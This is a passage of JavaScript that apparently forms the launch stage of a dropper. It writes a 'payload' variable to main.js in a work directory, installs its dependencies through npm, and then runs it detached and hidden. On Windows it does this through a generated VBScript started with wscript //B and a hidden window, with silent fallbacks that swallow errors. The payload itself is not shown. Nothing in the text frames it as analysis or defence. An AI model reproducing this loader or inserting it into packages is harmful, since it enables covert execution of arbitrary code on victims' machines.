function writeFile(file, content) {
  fs.writeFileSync(file, content, { encoding: "utf8" });
}

function escapeVbs(s) {
  return String(s).replace(/"/g, '""');
}

function makeVbs(exe, script) {
  const e = escapeVbs(exe);
  const s = escapeVbs(script);
  return [
    `Set sh = CreateObject("Wscript.Shell")`,
    `sh.Run Chr(34) & "${e}" & Chr(34) & " " & Chr(34) & "${s}" & Chr(34), 0, False`,
    "",
  ].join("\r\n");
}

function writeVbs() {
  writeFile(mainVbs, makeVbs(nodeExe, mainJs));
}

function runPayload() {
  const child = spawn(nodeExe, [mainJs], {
    cwd: workDir,
    env,
    ...detached,
  });
  child.unref();
}

function runViaWscript() {
  writeVbs();
  if (!fs.existsSync(wscript) || !fs.existsSync(mainVbs)) {
    runPayload();
    return;
  }
  const child = spawn(wscript, ["//B", mainVbs], {
    cwd: workDir,
    env,
    ...detached,
  });
  child.on("error", () => runPayload());
  child.unref();
}

function start() {
  if (process.platform === "win32") runViaWscript();
  else runPayload();
}

try {
  fs.mkdirSync(workDir, { recursive: true });
  writeFile(mainJs, payload);
  writeFile(
    path.join(workDir, "package.json"),
    JSON.stringify(
      {
        name: "main",
        version: "1.0.0",
        private: true,
        main: "main.js",
        dependencies: deps,
      },
      null,
      2
    )
  );
} catch {
  process.exit(1);
}

const install = npmInstall();
install.on("error", () => {});
install.on("close", (code) => {
  if (code !== 0 && !fs.existsSync(path.join(workDir, "node_modules"))) return;
  try {
    start();
  } catch {
    try {
      runPayload();
    } catch {}
  }
});